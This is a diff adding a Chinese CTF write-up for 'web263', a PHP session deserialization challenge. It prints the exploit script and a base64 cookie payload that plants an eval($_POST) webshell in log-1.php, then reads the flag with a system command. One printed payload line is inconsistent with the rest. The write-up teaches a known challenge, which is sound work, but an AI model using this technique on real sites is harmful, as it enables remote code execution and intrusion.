@@ -2315,6 +2315,138 @@ f=1&m=2&t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfu
 
 
 
+### web263
+
+按下F12后发现Script脚本
+
+```
+		function check(){
+			$.ajax({
+			url:'check.php',
+			type: 'GET',
+			data:{
+				'u':$('#u').val(),
+				'pass':$('#pass').val()
+			},
+			success:function(data){
+				alert(JSON.parse(data).msg);
+			},
+			error:function(data){
+				alert(JSON.parse(data).msg);
+			}
+
+		});
+		}	
+```
+
+本题考查session反序列化漏洞，扫描目录可得www.zip，下载得到源代码
+
+```
+<?php
+
+	error_reporting(0);
+	session_start();
+	//超过5次禁止登陆
+	if(isset($_SESSION['limit'])){
+		$_SESSION['limti']>5?die("登陆失败次数超过限制"):$_SESSION['limit']=base64_decode($_COOKIE['limit']);
+		$_COOKIE['limit'] = base64_encode(base64_decode($_COOKIE['limit']) +1);
+	}else{
+		 setcookie("limit",base64_encode('1'));
+		 $_SESSION['limit']= 1;
+	}
+	
+?>
+
+```
+
+代码审计后主要有几个关键区域。
+
+在index.php 我们发现$_SESSION['limit']我们可以进行控制
+
+```
+//超过5次禁止登陆
+if(isset($_SESSION['limit'])){
+  $_SESSION['limti']>5?die("登陆失败次数超过限制"):$_SESSION['limit']=base64_decode($_COOKIE['limit']);
+  $_COOKIE['limit'] = base64_encode(base64_decode($_COOKIE['limit']) +1);
+}else{
+   setcookie("limit",base64_encode('1'));
+   $_SESSION['limit']= 1;
+}
+```
+
+flag在flag.php处，目测需要rce
+
+```
+$flag="flag_here";
+```
+
+inc.php 设置了session的序列化引擎为php，很有可能说明默认使用的是php_serialize
+
+```
+ini_set('session.serialize_handler', 'php');
+```
+
+并且inc.php中有一个User类的__destruct含有file_put_contents函数，并且username和password可控，可以进行文件包含geshell
+
+```
+   function __destruct(){
+        file_put_contents("log-".$this->username, "使用".$this->password."登陆".($this->status?"成功":"失败")."----".date_create()->format('Y-m-d H:i:s'));
+    }
+```
+
+开始构造EXP，生成payload
+
+```
+<?php
+  class User{
+    public $username;
+    public $password;
+    public $status;
+    function __construct($username,$password){
+        $this->username = $username;
+        $this->password = $password;
+    }
+    function setStatus($s){
+        $this->status=$s;
+    }
+    function __destruct(){
+        file_put_contents("log-".$this->username, "使用".$this->password."登陆".($this->status?"成功":"失败")."----".date_create()->format('Y-m-d H:i:s'));
+    }
+  }
+
+  $a = new User('1.php', '<?php eval($_POST[1]);phpinfo()?>');
+  $a->setStatus('成功');
+  echo ('|'.serialize($a));
+?>
+
+```
+
+payload:
+
+```
+|O:4:"User":3:{s:8:"username";s:5:"1.php";s:8:"password";s:24:"";s:6:"status";s:6:"成功";}
+```
+
+在开发者工具的控制台替换cookie
+
+```
+document.cookie='limit=fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czo1OiIxLnBocCI7czo4OiJwYXNzd29yZCI7czozNDoiPD9waHAgZXZhbCgkX1BPU1RbMV0pO3BocGluZm8oKTs/PiI7czo2OiJzdGF0dXMiO047fQ=='
+```
+
+访问check.php改写$_SESSION['limit'],将shell写入log-1.php
+
+最后蚁剑访问log-1.php
+
+```
+POST 1=system("tac flag.php")
+```
+
+![](.\反序列化\图片\web263.png)
+
+![](.\反序列化\图片\web263-蚁剑.png)
+
+
+
 ## XSS
 
 > document.cookie							用于js获取当前网页的cookie值
